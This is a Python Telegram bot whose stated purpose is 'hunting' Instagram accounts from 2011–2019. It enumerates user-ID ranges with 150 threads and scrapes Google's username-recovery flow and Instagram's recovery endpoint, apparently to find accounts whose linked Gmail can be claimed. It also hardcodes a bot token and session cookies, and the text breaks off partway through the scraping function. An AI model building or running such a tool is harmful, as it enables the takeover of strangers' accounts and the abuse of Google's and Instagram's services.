import os
import sys
import re
import json
import string
import random
import hashlib
import uuid
import time
import sqlite3
from datetime import datetime
from threading import Thread
import requests
from requests import post as pp
from user_agent import generate_user_agent
from random import choice, randrange
import telebot
from telebot import types
from cfonts import render
from colorama import Fore, Style, init
from cryptography.fernet import Fernet
import psutil
from datetime import datetime, timedelta
# تهيئة اللون
init(autoreset=True)

# إعدادات البوت
INSTAGRAM_RECOVERY_URL = 'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
IG_SIG_KEY_VERSION = 'ig_sig_key_version'
SIGNED_BODY = 'signed_body'
COOKIE_VALUE = 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj'
CONTENT_TYPE_HEADER = 'Content-Type'
COOKIE_HEADER = 'Cookie'
USER_AGENT_HEADER = 'User-Agent'
DEFAULT_USER_AGENT = ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                      'AppleWebKit/537.36 (KHTML, like Gecko) '
                      'Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0')

GOOGLE_ACCOUNTS_URL = 'https://accounts.google.com'
GOOGLE_ACCOUNTS_DOMAIN = 'accounts.google.com'
REFERRER_HEADER = 'referer'
ORIGIN_HEADER = 'origin'
AUTHORITY_HEADER = 'authority'
CONTENT_TYPE_FORM = 'application/x-www-form-urlencoded; charset=UTF-8'
CONTENT_TYPE_FORM_ALT = 'application/x-www-form-urlencoded;charset=UTF-8'

TOKEN_FILE = 'tl.txt'
eizon_domain = '@gmail.com'
IMAGE_URL = 'https://ibb.co/HLBwnCKK'
CHANNEL_USERNAME = "@LEADERSYRIA"

# تهيئة البوت
bot = telebot.TeleBot("7332464929:AAHtLTe6F8CyUxnGHCyUul2QNi3QPyB1jPY")  # استبدل بتوكن بوتك

# متغيرات البوت
user_sessions = {}
active_searches = {}
infoinsta = {}
total_hits = 0
hits = 0
bad_insta = 0
bad_email = 0
good_ig = 0

# حالات المستخدم
class UserState:
    WAITING_CHOICE = 1
    SEARCH_RUNNING = 2
    SEARCH_PAUSED = 3

# التشفير
ENCRYPTION_KEY = Fernet.generate_key()
cipher_suite = Fernet(ENCRYPTION_KEY)

# تعريفات المدير
ADMIN_IDS = [7721705352]  # أضف chat_id الخاص بك هنا

# وظائف التشفير
def encrypt_data(data):
    return cipher_suite.encrypt(data.encode()).decode()


# قاعدة البيانات
def init_db():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (chat_id INTEGER PRIMARY KEY, 
                 username TEXT, 
                 join_date TEXT,
                 is_admin INTEGER DEFAULT 0,
                 search_count INTEGER DEFAULT 0)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS searches
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                 chat_id INTEGER,
                 start_time TEXT,
                 end_time TEXT,
                 hits INTEGER,
                 bad INTEGER,
                 good INTEGER,
                 year_range TEXT)''')
    
    # جدول جديد للوضع المدفوع
    c.execute('''CREATE TABLE IF NOT EXISTS premium_settings
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                 is_premium_mode INTEGER DEFAULT 0,
                 last_updated TEXT)''')
    
    # جدول للصلاحيات المؤقتة
    c.execute('''CREATE TABLE IF NOT EXISTS temporary_access
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                 chat_id INTEGER UNIQUE,
                 expiry_date TEXT)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS usage_limits
                 (chat_id INTEGER PRIMARY KEY,
                 last_reset_time TEXT,
                 hourly_count INTEGER DEFAULT 0)''')
                     
    c.execute('''CREATE TABLE IF NOT EXISTS custom_limits
                 (chat_id INTEGER PRIMARY KEY,
                 hourly_limit INTEGER DEFAULT 5)''')
                 
    c.execute('''CREATE TABLE IF NOT EXISTS reports
             (report_id INTEGER PRIMARY KEY AUTOINCREMENT,
              user_id INTEGER,
              message TEXT,
              timestamp TEXT,
              admin_id INTEGER DEFAULT NULL,
              reply TEXT DEFAULT NULL)''')
                               
    conn.commit()
    conn.close()

def measure_internet_speed():
    """
    دالة لقياس سرعة الاتصال بالإنترنت (تقريبي)
    """
    try:
        start_time = time.time()
        # استخدام موقع سريع للاستجابة
        response = requests.get('https://www.google.com', timeout=5)
        if response.status_code == 200:
            # حساب الوقت المستغرق بالمللي ثانية
            speed = 1 / (time.time() - start_time)  # تقريب للسرعة
            return min(speed, 100)  # حد أقصى 100 Mbps للواقعية
        return 0
    except:
        return 0  # في حالة الخطأ
        
def check_hourly_limit(chat_id, default_limit=5):
    """التحقق مما إذا كان المستخدم تجاوز الحد المسموح به"""
    custom_limit = get_custom_limit(chat_id)
    limit = custom_limit if custom_limit is not None else default_limit
    
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    # ... (باقي الكود كما هو)
    
    c.execute("SELECT last_reset_time, hourly_count FROM usage_limits WHERE chat_id=?", (chat_id,))
    result = c.fetchone()
    
    now = datetime.now()
    
    if not result:
        c.execute("INSERT INTO usage_limits VALUES (?, ?, ?)", 
                 (chat_id, now.isoformat(), 0))
        conn.commit()
        conn.close()
        return True
    
    last_reset, count = result
    last_reset = datetime.fromisoformat(last_reset)
    
    if (now - last_reset) >= timedelta(hours=1):
        c.execute("UPDATE usage_limits SET last_reset_time=?, hourly_count=0 WHERE chat_id=?", 
                 (now.isoformat(), chat_id))
        conn.commit()
        conn.close()
        return True
    
    if count < limit:
        conn.close()
        return True
    
    conn.close()
    return False

def increment_hourly_count(chat_id):
    """زيادة عداد الاستخدام للمستخدم"""
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    c.execute("UPDATE usage_limits SET hourly_count = hourly_count + 1 WHERE chat_id=?", (chat_id,))
    conn.commit()
    conn.close()
 
def is_user_member(user_id, channel_username, max_retries=3):
    for attempt in range(max_retries):
        try:
            chat_member = bot.get_chat_member(f"@{channel_username}", user_id)
            return chat_member.status in ["member", "administrator", "creator"]
        except Exception as e:
            print(f"Attempt {attempt + 1} failed: {e}")
            if attempt == max_retries - 1:
                print(f"Error checking membership after {max_retries} attempts")
                return False  # أو true حسب احتياجك
            time.sleep(2)  # انتظر قبل إعادة المحاولة
         
def send_admin_notification(new_user, total_users):
    user_info = f"""
🆕 مستخدم جديد انضم إلى البوت!
━━━━━━━━━━━━━━━━━━
👤 الاسم: {new_user.first_name} {new_user.last_name or ''}
🆔 الآيدي: <code>{new_user.id}</code>
📌 اليوزر: @{new_user.username if new_user.username else 'لا يوجد'}
📅 تاريخ الانضمام: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
👥 عدد المستخدمين الكلي: {total_users}
"""
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton(
        text="مراسلة المستخدم",
        url=f"tg://user?id={new_user.id}"
    ))
    
    for admin_id in ADMIN_IDS:
        try:
            bot.send_message(
                admin_id,
                user_info,
                reply_markup=markup,
                parse_mode='HTML'
            )
        except Exception as e:
            print(f"⚠️ فشل إرسال إشعار للمدير {admin_id}: {e}")
            
            
def set_custom_limit(chat_id, limit):
    """تعيين حد مخصص للمستخدم"""
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO custom_limits VALUES (?, ?)", (chat_id, limit))
    conn.commit()
    conn.close()

def get_custom_limit(chat_id):
    """الحصول على الحد المخصص للمستخدم"""
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT hourly_limit FROM custom_limits WHERE chat_id=?", (chat_id,))
    result = c.fetchone()
    conn.close()
    return result[0] if result else None
                
def add_default_admin():
       conn = sqlite3.connect('users.db')
       c = conn.cursor()
       c.execute("INSERT OR IGNORE INTO users VALUES (?, ?, ?, ?, ?)", 
                 (ADMIN_IDS[0], "admin", datetime.now().isoformat(), 1, 0))
       conn.commit()
       conn.close()

init_db()
add_default_admin()

# لوحة المفاتيح
def create_years_keyboard():
    markup = types.InlineKeyboardMarkup()
    row1 = [
        types.InlineKeyboardButton("2011", callback_data="year_2011"),
        types.InlineKeyboardButton("2012", callback_data="year_2012"),
        types.InlineKeyboardButton("2013", callback_data="year_2013")
    ]
    row2 = [
        types.InlineKeyboardButton("2014", callback_data="year_2014"),
        types.InlineKeyboardButton("2015", callback_data="year_2015"),
        types.InlineKeyboardButton("2016", callback_data="year_2016")
    ]
    row3 = [
        types.InlineKeyboardButton("2017", callback_data="year_2017"),
        types.InlineKeyboardButton("2018", callback_data="year_2018"),
        types.InlineKeyboardButton("2019", callback_data="year_2019")
    ]
    row4 = [
        types.InlineKeyboardButton("2011-2019 (الكل)", callback_data="year_all")
    ]
    markup.add(*row1)
    markup.add(*row2)
    markup.add(*row3)
    markup.add(*row4)
    return markup

def create_control_keyboard():
    markup = types.InlineKeyboardMarkup()
    row1 = [
        types.InlineKeyboardButton("⏸ إيقاف مؤقت", callback_data="pause_search"),
        types.InlineKeyboardButton("⏹ إيقاف", callback_data="stop_search")
    ]
    row2 = [
        types.InlineKeyboardButton("📊 الإحصائيات", callback_data="show_stats"),
        types.InlineKeyboardButton("📥 تصدير النتائج", callback_data="export_results")
    ]
    markup.add(*row1)
    markup.add(*row2)
    return markup

# أوامر البوت
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    user_id = message.from_user.id
    channel_username = "LEADERSYRIA"  # تأكد من استبدالها بيوزر قناتك
    
    if not is_user_member(user_id, channel_username):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton(
            text="⚡ انضم للقناة أولاً", 
            url=f"https://t.me/{channel_username}")
        )
        bot.send_message(
            user_id,
            "**⚠️ يجب الاشتراك في القناة قبل استخدام البوت!**\n\n"
            "اضغط على الزر أدناه للانضمام ثم أرسل /start مرة أخرى.",
            reply_markup=markup,
            parse_mode="Markdown"
        )
        return
    
    chat_id = message.chat.id
    user = message.from_user
    
    # التحقق من الصلاحية في الوضع المدفوع
    if get_premium_mode() and not check_user_access(chat_id):
        bot.send_message(chat_id, """
⛔ البوت حالياً في الوضع المدفوع
━━━━━━━━━━━━━━━━━━
للحصول على صلاحية استخدام البوت، يرجى التواصل مع المسؤول.
""")
        return
    
    # تسجيل المستخدم الجديد
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    try:
        # التحقق مما إذا كان المستخدم جديداً
        c.execute("SELECT COUNT(*) FROM users WHERE chat_id=?", (chat_id,))
        is_new_user = c.fetchone()[0] == 0
        
        c.execute("INSERT OR IGNORE INTO users VALUES (?, ?, ?, ?, ?)", 
                (chat_id, user.username, datetime.now().isoformat(), 0, 0))
        conn.commit()
        
        if is_new_user:
            # حساب عدد المستخدمين الكلي
            c.execute("SELECT COUNT(*) FROM users")
            total_users = c.fetchone()[0]
            
            # إرسال إشعار للمدير
            send_admin_notification(user, total_users)
            
    finally:
        # إغلاق الاتصال بشكل آمن
        conn.close()
    
    user_sessions[chat_id] = {'state': UserState.WAITING_CHOICE}

    # إنشاء الأزرار
    markup = types.InlineKeyboardMarkup(row_width=2)

    btn_start = types.InlineKeyboardButton("🔍 بدء البحث", callback_data="start_search")
    btn_help = types.InlineKeyboardButton("❓ المساعدة والأوامر", callback_data="show_help")
    btn_report = types.InlineKeyboardButton("⚠️ الإبلاغ عن مشكلة", callback_data="report_menu")
    btn_channel = types.InlineKeyboardButton("📢 قناتنا الرسمية", url="https://t.me/LEADERSYRIA")
    btn_my_reports = types.InlineKeyboardButton("📬 بلاغاتي السابقة", callback_data="my_reports")
    
    markup.add(btn_start)
    markup.row(btn_help, btn_report)
    markup.row(btn_channel, btn_my_reports)

    welcome_text = """
⌯ أهــلـاً وسـهــلاً بـك فـي بـوت 𝑳𝒆𝒂𝒅𝒆𝒓𝑺𝒚𝒓𝒊𝒂 𝑨𝑪𝑪  
︙بوت صـيـد حـسـابـات الإنـسـتـغـرام كـامـل السـنـوات  
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ  
✦ إخـتـر مـن الأزْرار أدنـاه لـلبـدء:
"""
    bot.send_message(chat_id, welcome_text, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "show_help")
def show_help_commands(call):
    help_text = """
📚 <b>دليل استخدام البوت</b>
━━━━━━━━━━━━━━━━━━

<b>🎯 كيفية البحث:</b>
1. اضغط على "بدء البحث"
2. اختر سنة إنشاء الحسابات
3. انتظر حتى تظهر النتائج
4. استخدم أزرار التحكم لإدارة البحث

<b>⚙️ الأوامر المتاحة:</b>
• /start - بدء التشغيل
• /help - عرض التعليمات
• /stats - إحصائياتك
• /myaccess - التحقق من صلاحيتك (في الوضع المدفوع)  
• /mylimit - معرفة استخدامك المتبقي (حدود الساعة)  

<b>🔍 خيارات البحث:</b>
يمكنك البحث عن حسابات حسب سنة الإنشاء:
- 2011 إلى 2019
- أو اختر نطاق معين

<b>📊 نتائج البحث:</b>
سيتم إعلامك بـ:
- الحسابات الصالحة
- الحسابات غير الصالحة
- إمكانية تصدير النتائج

<b>❗ ملاحظات مهمة:</b>
- البحث قد يستغرق بعض الوقت
- جودة النتائج تعتمد على سنة الإنشاء
- يمكنك إيقاف البحث في أي وقت

<code>للتواصل مع الدعم الفني:</code>
@SYRIA7R
"""
    
    markup = types.InlineKeyboardMarkup()
    btn_back = types.InlineKeyboardButton("🔙 العودة للقائمة الرئيسية", callback_data="back_to_main")
    markup.add(btn_back)
    
    bot.edit_message_text(
        help_text,
        call.message.chat.id,
        call.message.message_id,
        reply_markup=markup,
        parse_mode='HTML'
    )
    
@bot.callback_query_handler(func=lambda call: call.data == "back_to_main")
def back_to_main_menu(call):
    send_welcome(call.message)  # يعيد عرض رسالة الترحيب الرئيسية
        
# معالجة ضغطة زر "بدء البحث"
@bot.callback_query_handler(func=lambda call: call.data == "start_search")
def show_years(call):
    bot.edit_message_text("اختر سنة إنشاء الحساب:", call.message.chat.id, call.message.message_id, reply_markup=create_years_keyboard())

# معالجة ضغطة زر "المطور"
@bot.callback_query_handler(func=lambda call: call.data == "show_developer")
def show_dev(call):
    dev_info = """
👤 معلومات المطور:
━━━━━━━━━━━━━━━━━━
- الاسم: @SYRIA7R
- القناة: @LEADERSYRIA
- للتواصل: اضغط /contact
"""
    bot.answer_callback_query(call.id)
    bot.send_message(call.message.chat.id, dev_info)

@bot.callback_query_handler(func=lambda call: call.data == 'report_menu')
def report_menu(call):
    try:
        markup = types.InlineKeyboardMarkup()
        btn_new_report = types.InlineKeyboardButton("✉️ إنشاء بلاغ جديد", callback_data="new_report")
        btn_my_reports = types.InlineKeyboardButton("📬 بلاغاتي السابقة", callback_data="my_reports")
        btn_back = types.InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main")
        markup.add(btn_new_report, btn_my_reports, btn_back)
        
        # التحقق مما إذا كانت الرسالة تحتاج للتحديث حقاً
        if call.message.text != "📨 لوحة الإبلاغ عن المشاكل:" or \
           call.message.reply_markup != markup:
            bot.edit_message_text(
                "📨 لوحة الإبلاغ عن المشاكل:\n\n"
                "يمكنك إرسال أي مشكلة تواجهها وسيقوم المشرف بالرد عليك",
                call.message.chat.id,
                call.message.message_id,
                reply_markup=markup
            )
    except Exception as e:
        print(f"Error in report_menu: {e}")
        # بديل في حالة الخطأ
        bot.answer_callback_query(call.id, "تم تحديث القائمة")
    
@bot.callback_query_handler(func=lambda call: call.data == 'new_report')
def start_report(call):
    msg = bot.send_message(call.message.chat.id, 
                         "📝 يرجى كتابة رسالة الإبلاغ الخاصة بك:\n"
                         "")
    bot.register_next_step_handler(msg, process_report)

def process_report(message):
    user_id = message.from_user.id
    report_text = message.text or "بلاغ بدون نص"
    
    # حفظ البلاغ في قاعدة البيانات
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("INSERT INTO reports (user_id, message, timestamp) VALUES (?, ?, ?)",
              (user_id, report_text, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    # إرسال إشعار للمطورين
    notify_admins_about_report(user_id, report_text, message.message_id)
    
    bot.send_message(message.chat.id, "✅ تم استلام بلاغك بنجاح وسيتم الرد عليه قريباً")

def notify_admins_about_report(user_id, report_text, message_id):
    report_msg = f"""
⚠️ بلاغ جديد من مستخدم:
━━━━━━━━━━━━━━━━━━
👤 المستخدم: <a href='tg://user?id={user_id}'>{user_id}</a>
📝 المحتوى: {report_text[:500]}
━━━━━━━━━━━━━━━━━━
⏱ الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M')}
"""
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("↩️ الرد على البلاغ", callback_data=f"reply_report_{user_id}_{message_id}"))
    
    for admin_id in ADMIN_IDS:
        try:
            bot.send_message(admin_id, report_msg, reply_markup=markup, parse_mode='HTML')
        except Exception as e:
            print(f"Failed to notify admin {admin_id}: {e}")
            
@bot.callback_query_handler(func=lambda call: call.data.startswith('reply_report_'))
def reply_to_report(call):
    _, _, user_id, original_msg_id = call.data.split('_')
    msg = bot.send_message(call.message.chat.id,
                         f"⤵️ يرجى كتابة ردك على المستخدم {user_id}:")
    bot.register_next_step_handler(msg, process_reply, user_id, original_msg_id)

def process_reply(message, user_id, original_msg_id):
    admin_id = message.from_user.id
    reply_text = message.text
    
    # حفظ الرد في قاعدة البيانات
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("UPDATE reports SET admin_id=?, reply=? WHERE user_id=? AND timestamp=(SELECT MAX(timestamp) FROM reports WHERE user_id=?)",
              (admin_id, reply_text, user_id, user_id))
    conn.commit()
    conn.close()
    
    # إرسال الرد للمستخدم
    try:
        bot.send_message(user_id,
                        f"📬 لديك رد من الدعم الفني:\n\n"
                        f"{reply_text}\n\n"
                        f"يمكنك الرد على هذه الرسالة لمتابعة المحادثة")
        
        # تأكيد للمشرف
        bot.send_message(admin_id,
                        f"✅ تم إرسال ردك بنجاح إلى المستخدم {user_id}")
    except Exception as e:
        bot.send_message(admin_id,
                       f"❌ فشل إرسال الرد للمستخدم {user_id}. قد يكون قام بحظر البوت.")
                                           
@bot.message_handler(func=lambda message: message.reply_to_message and "رد من الدعم الفني" in message.reply_to_message.text)
def handle_follow_up(message):
    original_text = message.reply_to_message.text
    user_id = message.from_user.id
    
    # البحث عن المشرف الأصلي
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT admin_id FROM reports WHERE user_id=? ORDER BY timestamp DESC LIMIT 1", (user_id,))
    result = c.fetchone()
    conn.close()
    
    if result and result[0]:
        admin_id = result[0]
        try:
            bot.send_message(admin_id,
                            f"📩 متابعة من المستخدم {user_id}:\n\n"
                            f"{message.text}\n\n"
                            f"يمكنك الرد على هذه الرسالة")
        except Exception as e:
            bot.send_message(user_id,
                           "❌ تعذر إرسال متابعتك. يرجى المحاولة لاحقاً.")
                                                                      
@bot.callback_query_handler(func=lambda call: call.data == 'my_reports')
def show_my_reports(call):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT timestamp, message, reply FROM reports WHERE user_id=?", (call.from_user.id,))
    reports = c.fetchall()
    conn.close()
    
    if not reports:
        bot.send_message(call.message.chat.id, "⚠️ لم تقم بإرسال أي بلاغات سابقة")
        return
    
    for report in reports:
        timestamp, message, reply = report
        report_text = f"""
📅 {timestamp}
━━━━━━━━━━━━━━
📤 بلاغك: {message}
"""
        if reply:
            report_text += f"\n📥 الرد: {reply}"
            
        bot.send_message(call.message.chat.id, report_text)
                                                                              
@bot.callback_query_handler(func=lambda call: call.data.startswith('year_'))
def handle_year_selection(call):
    try:
        user_id = call.from_user.id  # التصحيح هنا: استخدام call بدلاً من message
        channel_username = "@LEADERSYRIA"
        chat_id = call.message.chat.id
        
        # التحقق من الصلاحية في الوضع المدفوع
        if get_premium_mode() and not check_user_access(chat_id):
            bot.answer_callback_query(call.id, "⛔ البوت في الوضع المدفوع. ليس لديك صلاحية الاستخدام", show_alert=True)
            return
        
        # التحقق من الحدود بالساعة
        if not check_hourly_limit(chat_id):
            bot.answer_callback_query(call.id, """
⏳ لقد وصلت إلى الحد الأقصى للاستخدام لهذه الساعة
━━━━━━━━━━━━━━━━━━
يمكنك المحاولة مرة أخرى بعد ساعة من آخر استخدام
""", show_alert=True)
            return
        
        choice = call.data.split('_')[1]
        
        year_ranges = {
            '2011': (10000, 17699999),
            '2012': (17699999, 263014407),
            '2013': (263014407, 361365133),
            '2014': (361365133, 1629010000),
            '2015': (1629010000, 2500000000),
            '2016': (2500000000, 3713668786),
            '2017': (3713668786, 5699785217),
            '2018': (5699785217, 8597939245),
            '2019': (8597939245, 21254029834),
            'all': (10000, 21254029834)
        }
        
        bbk, id = year_ranges.get(choice, (10000, 21254029834))
        
        user_sessions[chat_id] = {
            'state': UserState.SEARCH_RUNNING,
            'bbk': bbk,
            'id': id,
            'hits': 0,
            'bad': 0,
            'good': 0,
            'running': True,
            'year': choice if choice != 'all' else '2011-2019'
        }
        
        # زيادة العداد
        increment_hourly_count(chat_id)
                        
    except Exception as e:
        print(f"Error in handle_year_selection: {e}")
        bot.answer_callback_query(call.id, "⚠️ حدث خطأ أثناء معالجة طلبك", show_alert=True)
    
    # تسجيل بدء البحث
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("INSERT INTO searches VALUES (NULL, ?, ?, NULL, 0, 0, 0, ?)",
              (chat_id, datetime.now().isoformat(), user_sessions[chat_id].get('year', 'unknown')))
    conn.commit()
    conn.close()
    
    # بدء البحث
    active_searches[chat_id] = True
    for _ in range(150):
        Thread(target=eizon_python, args=(chat_id, bbk, id)).start()
    
    control_msg = f"""
🔎 <b>جاري البحث عن حسابات سنة {user_sessions[chat_id]['year']}</b>
━━━━━━━━━━━━━━━━━━

⚙️ <b>استخدم الأزرار أدناه للتحكم:</b>
"""
    bot.send_message(chat_id, control_msg,
                    reply_markup=create_control_keyboard(),
                    parse_mode='HTML')
                    
@bot.message_handler(commands=['ping'])
def check_bot_speed(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "⛔ هذا الأمر متاح للمشرفين فقط!")
        return
    
    try:
        # قياس وقت استجابة البوت
        start_time = time.time()
        test_msg = bot.reply_to(message, "🔄 جاري اختبار السرعة...")
        bot_response_time = (time.time() - start_time) * 1000  # مللي ثانية

        # قياس سرعة الإنترنت
        internet_speed = measure_internet_speed()  # Mbps

        # قياس استخدام الذاكرة
        process = psutil.Process(os.getpid())
        memory_usage = process.memory_info().rss / 1024 / 1024  # MB

        # حالة الخادم
        server_status = "✅ ممتاز"
        if bot_response_time > 1000:
            server_status = "⚠️ يحتاج تحسين"
        elif bot_response_time > 2000:
            server_status = "❌ بطيء جداً"

        # إرسال النتائج
        bot.edit_message_text(
            f"""
⚡ تقرير أداء البوت:
━━━━━━━━━━━━━━━━
⏱ سرعة استجابة البوت: {bot_response_time:.2f} مللي ثانية
🌐 سرعة الإنترنت التقريبية: {internet_speed:.2f} Mbps
💾 استخدام الذاكرة: {memory_usage:.2f} MB
👥 المستخدمون النشطون: {len(user_sessions)}
🛠 الحالة: {server_status}
━━━━━━━━━━━━━━━━
📅 آخر تحديث: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
""",
            chat_id=message.chat.id,
            message_id=test_msg.message_id
        )

    except Exception as e:
        bot.reply_to(message, f"⚠️ حدث خطأ أثناء قياس الأداء: {str(e)}")
                        
def auto_diagnose():
    issues = []
    
    # كشف البطء
    if len(performance_log) > 5:
        avg = sum(p['response'] for p in performance_log[-5:]) / 5
        if avg > 1000:
            issues.append("⚡ البوت يعاني من بطء في الاستجابة")
    
    # كشف مشاكل الذاكرة
    if psutil.Process(os.getpid()).memory_info().rss > 500 * 1024 * 1024:
        issues.append("💾 استخدام الذاكرة مرتفع (>500MB)")
    
    return issues if issues else ["✅ لا توجد مشاكل مكتشفة"]
                            
@bot.message_handler(commands=['myaccess'])
def check_access(message):
    chat_id = message.chat.id
    
    if not get_premium_mode():
        bot.send_message(chat_id, "🔓 البوت حالياً في الوضع المجاني، يمكن للجميع استخدامه")
        return
    
    if chat_id in ADMIN_IDS:
        bot.send_message(chat_id, "👑 أنت مدير البوت، لديك صلاحية كاملة")
        return
    
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT expiry_date FROM temporary_access WHERE chat_id=?", (chat_id,))
    result = c.fetchone()
    conn.close()
    
    if result:
        expiry_date = datetime.fromisoformat(result[0])
        remaining_days = (expiry_date - datetime.now()).days
        bot.send_message(chat_id, f"""
✅ لديك صلاحية استخدام البوت
━━━━━━━━━━━━━━━━━━
⏳ المدة المتبقية: {remaining_days} يوم
📅 تنتهي الصلاحية في: {expiry_date.strftime('%Y-%m-%d')}
""")
    else:
        bot.send_message(chat_id, """
⛔ ليس لديك صلاحية استخدام البوت حالياً
━━━━━━━━━━━━━━━━━━
للحصول على صلاحية، يرجى التواصل مع المسؤول.
""")

@bot.message_handler(commands=['mylimit'])
def check_my_limit(message):
    chat_id = message.chat.id
    custom_limit = get_custom_limit(chat_id)
    limit = custom_limit if custom_limit is not None else 5
    
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    c.execute("SELECT last_reset_time, hourly_count FROM usage_limits WHERE chat_id=?", (chat_id,))
    result = c.fetchone()
    
    if not result:
        bot.send_message(chat_id, "✅ لم تستخدم البوت بعد في هذه الساعة")
        return
    
    last_reset, count = result
    last_reset = datetime.fromisoformat(last_reset)
    next_reset = last_reset + timedelta(hours=1)
    time_left = next_reset - datetime.now()
    
    hours, remainder = divmod(time_left.seconds, 3600)
    minutes = remainder // 60
    
    limit_type = "مخصص" if custom_limit is not None else "افتراضي"
    
    bot.send_message(chat_id, f"""
📊 استخدامك الحالي:
━━━━━━━━━━━━━━━━━━
🔢 عدد الطلبات هذه الساعة: {count}/{limit} ({limit_type})
⏳ الوقت المتبقي لإعادة التعيين: {hours} ساعة و {minutes} دقيقة
""")
    
    conn.close()
    
    last_reset, count = result
    last_reset = datetime.fromisoformat(last_reset)
    next_reset = last_reset + timedelta(hours=1)
    time_left = next_reset - datetime.now()
    
    hours, remainder = divmod(time_left.seconds, 3600)
    minutes = remainder // 60
    
    bot.send_message(chat_id, f"""
📊 استخدامك الحالي:
━━━━━━━━━━━━━━━━━━
🔢 عدد الطلبات هذه الساعة: {count}/5
⏳ الوقت المتبقي لإعادة التعيين: {hours} ساعة و {minutes} دقيقة
""")
    
    conn.close()
    
@bot.callback_query_handler(func=lambda call: call.data in ['pause_search', 'stop_search', 'show_stats', 'export_results'])
def handle_control_buttons(call):
    chat_id = call.message.chat.id
    action = call.data
    
    if chat_id not in user_sessions:
        bot.answer_callback_query(call.id, "❌ لا يوجد بحث نشط!")
        return
    
    if action == 'pause_search':
        if user_sessions[chat_id]['state'] == UserState.SEARCH_RUNNING:
            user_sessions[chat_id]['state'] = UserState.SEARCH_PAUSED
            active_searches[chat_id] = False
            bot.answer_callback_query(call.id, "⏸ تم إيقاف البحث مؤقتًا")
        else:
            user_sessions[chat_id]['state'] = UserState.SEARCH_RUNNING
            active_searches[chat_id] = True
            start_search(chat_id, user_sessions[chat_id]['bbk'], user_sessions[chat_id]['id'])
            bot.answer_callback_query(call.id, "▶️ تم استئناف البحث")
            
    elif action == 'stop_search':
        active_searches[chat_id] = False
        user_sessions[chat_id]['state'] = UserState.WAITING_CHOICE
        
        # تسجيل نهاية البحث
        conn = sqlite3.connect('users.db')
        c = conn.cursor()
        c.execute("""UPDATE searches SET end_time=?, hits=?, bad=?, good=? 
                   WHERE chat_id=? AND end_time IS NULL""",
                  (datetime.now().isoformat(), 
                   user_sessions[chat_id]['hits'],
                   user_sessions[chat_id]['bad'],
                   user_sessions[chat_id]['good'],
                   chat_id))
        conn.commit()
        conn.close()
        
        bot.answer_callback_query(call.id, "⏹ تم إيقاف البحث")
        bot.send_message(chat_id, "✅ تم إيقاف البحث بنجاح. يمكنك بدء بحث جديد من /start")
        
    elif action == 'show_stats':
        stats = user_sessions[chat_id]
        stats_text = f"""
📊 <b>إحصائيات البحث الحالية:</b>
━━━━━━━━━━━━━━━━━━
🟢 الحسابات الشغالة: {stats['hits']}
🔴 الحسابات مو شغالة: {stats['bad']}"""
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, stats_text, parse_mode='HTML')
        
    elif action == 'export_results':
        try:
            with open('eizonhits.txt', 'rb') as file:
                bot.send_document(chat_id, file, caption="📁 نتائج البحث المحفوظة")
        except:
            bot.answer_callback_query(call.id, "❌ لا توجد نتائج لتصديرها")

# وظائف البحث
def Eizon():
    try:
        alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
        n1 = ''.join(choice(alphabet) for _ in range(randrange(6, 9)))
        n2 = ''.join(choice(alphabet) for _ in range(randrange(3, 9)))
        host = ''.join(choice(alphabet) for _ in range(randrange(15, 30)))
        headers = {
            'accept': '*/*',
            'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
            'google-accounts-xsrf': '1',
            USER_AGENT_HEADER: str(generate_user_agent())
        }
        recovery_url = (f"{GOOGLE_ACCOUNTS_URL}/signin/v2/usernamerecovery"
                        "?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB")
        res1 = requests.get(recovery_url, headers=headers)
        tok = re.search(
            'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
            res1.text
        ).group(2)
        cookies = {'__Host-GAPS': host}
        headers2 = {
            AUTHORITY_HEADER: GOOGLE_ACCOUNTS_DOMAIN,
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
